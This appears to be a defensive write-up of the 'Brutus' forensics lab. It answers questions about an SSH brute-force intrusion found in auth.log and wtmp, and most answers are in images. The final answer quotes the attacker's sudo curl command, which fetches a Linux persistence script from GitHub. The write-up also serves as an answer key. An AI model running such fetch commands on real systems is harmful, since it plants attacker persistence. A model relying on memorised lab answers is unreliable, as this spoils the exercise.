# Brutus - Very Easy

>Question 1:
>Analyzing the auth.log, can you identify the IP address used by the attacker to carry out a brute force attack?

![image](https://github.com/user-attachments/assets/3727600e-fac8-476b-92bc-3833f5e04681)

>Question 2:
>The brute force attempts were successful, and the attacker gained access to an account on the server. What is the username of this account?

![image](https://github.com/user-attachments/assets/4e71d268-39f2-44da-b437-1eb584e40bb6)

>Question 3:
>Can you identify the timestamp when the attacker manually logged in to the server to carry out their objectives?

```bash
utmpdump wtmp
```

![image](https://github.com/user-attachments/assets/c4ee6b6b-b342-4f27-81ed-966f5bee7260)

>Question 4:
>SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?

![image](https://github.com/user-attachments/assets/119f6ff5-2553-4eab-adb9-30f29aec1526)

>Question 5:
>The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?

![image](https://github.com/user-attachments/assets/46691f82-3d17-43d2-a503-bb91918b7b23)

>Question 6:
>What is the MITRE ATT&CK sub-technique ID used for persistence?

![image](https://github.com/user-attachments/assets/8dfead5f-5a8d-499a-a226-dc8e52a632a5)
>Question 7:
>How long did the attacker's first SSH session last based on the previously confirmed authentication time and session ending within the auth.log? (seconds)

![image](https://github.com/user-attachments/assets/c6b67ec9-9b17-4b8d-a0ad-394f998baa87)

>Answer: 279 seconds

>Question 8:
>The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?

![image](https://github.com/user-attachments/assets/da2ca8ff-a822-46a8-82fc-fa57e68febcf)

>Answer: /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh

![image](https://github.com/user-attachments/assets/878fd8c0-ffe7-4bdb-84eb-0fdb997ea5fc)
